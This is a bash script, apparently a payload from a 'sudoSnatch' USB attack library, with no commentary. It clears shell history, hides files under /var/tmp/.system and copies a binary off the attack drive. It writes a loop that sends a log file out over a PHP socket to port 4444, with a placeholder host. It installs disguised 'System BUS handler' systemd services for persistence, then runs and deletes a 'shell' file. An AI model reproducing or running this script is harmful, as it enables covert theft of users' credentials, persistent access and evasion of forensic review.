#!/bin/bash
unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
mkdir /var/tmp/.system
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cp -r $mntt/payloads/library/sudoSnatch/systemMgr /var/tmp/.system/
chmod +x /var/tmp/.system/systemMgr
touch /var/tmp/.system/sysLog
echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"cat /var/tmp/.system/sysLog "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
chmod +x /var/tmp/.system/systemBus
mkdir -p ~/.config/systemd/user
echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
chmod +x /var/tmp/.system/reboot
echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
systemctl --user daemon-reload
systemctl --user enable --now systemBUS.service
systemctl --user start --now systemBUS.service
systemctl --user enable --now reboot.service
systemctl --user start --now reboot.service
cp -r $mntt/payloads/library/sudoSnatch/shell /tmp/
chmod +x /tmp/shell && /tmp/./shell && rm /tmp/shell
